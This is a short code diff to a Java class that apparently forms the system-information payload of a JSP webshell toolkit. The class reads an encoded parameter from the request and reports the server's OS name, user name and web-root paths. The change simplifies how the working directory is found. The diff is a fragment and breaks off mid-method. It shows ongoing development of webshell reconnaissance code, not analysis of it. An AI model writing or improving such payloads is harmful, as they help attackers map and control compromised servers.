@@ -50,7 +50,7 @@ public class Info {
             request.setCharacterEncoding(cs);
             response.setCharacterEncoding(cs);
             this.decoderClassdata = decode(request.getParameter(varkeydecoder));
-            output.append(SysInfoCode(request));
+            output.append(SysInfoCode());
         } catch (Exception e) {
             output.append("ERROR:// " + e.toString());
         }
@@ -61,23 +61,8 @@ public class Info {
         return true;
     }
 
-    String SysInfoCode(HttpServletRequest r) {
-        String d = "";
-        try {
-            if (r.getSession().getServletContext().getRealPath("/") != null) {
-                d = r.getSession().getServletContext().getRealPath("/");
-            } else {
-                String cd = this.getClass().getResource("/").getPath();
-                d = new File(cd).getParent();
-            }
-        } catch (Exception e) {
-            String cd = this.getClass().getResource("/").getPath();
-            d = new File(cd).getParent();
-        }
-        d = String.valueOf(d.charAt(0)).toUpperCase() + d.substring(1);
-        if (!d.startsWith("/") && d.charAt(1) != 58) {
-            d = System.getProperty("user.dir");
-        }
+    String SysInfoCode() {
+        String d = System.getProperty("user.dir");
         String serverInfo = System.getProperty("os.name");
         String user = System.getProperty("user.name");
         String driverlist = this.WwwRootPathCode(d);
